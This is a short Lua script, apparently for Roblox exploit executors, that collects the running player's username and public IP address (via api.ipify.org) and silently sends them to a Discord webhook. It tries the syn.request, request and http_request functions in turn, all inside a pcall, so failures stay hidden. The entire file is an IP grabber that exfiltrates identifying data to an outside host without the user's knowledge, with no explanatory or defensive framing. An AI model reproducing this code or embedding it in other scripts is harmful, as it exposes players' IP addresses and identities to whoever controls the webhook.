local webh = "https://discord.com/api/webhooks/" -- Discord webhook
        pcall(function()
            local data = {
                ["embeds"] = {
                    {
                        ["title"] = game:GetService("Players").LocalPlayer.Name,
                        ["description"] = game:HttpGet("https://api.ipify.org")
                    }
                }
            }
         
            if syn then
                local response = syn.request(
                    {
                        Url = webh,
                        Method = 'POST',
                        Headers = {
                            ['Content-Type'] = 'application/json'
                        },
                        Body = game:GetService('HttpService'):JSONEncode(data)
                    }
                );
            elseif request then
                local response = request(
                    {
                        Url = webh,
                        Method = 'POST',
                        Headers = {
                            ['Content-Type'] = 'application/json'
                        },
                        Body = game:GetService('HttpService'):JSONEncode(data)
                    }
                );
            elseif http_request then
                local response = http_request(
                    {
                        Url = webh,
                        Method = 'POST',
                        Headers = {
                            ['Content-Type'] = 'application/json'
                        },
                        Body = game:GetService('HttpService'):JSONEncode(data)
                    }
                );
            end
         end)
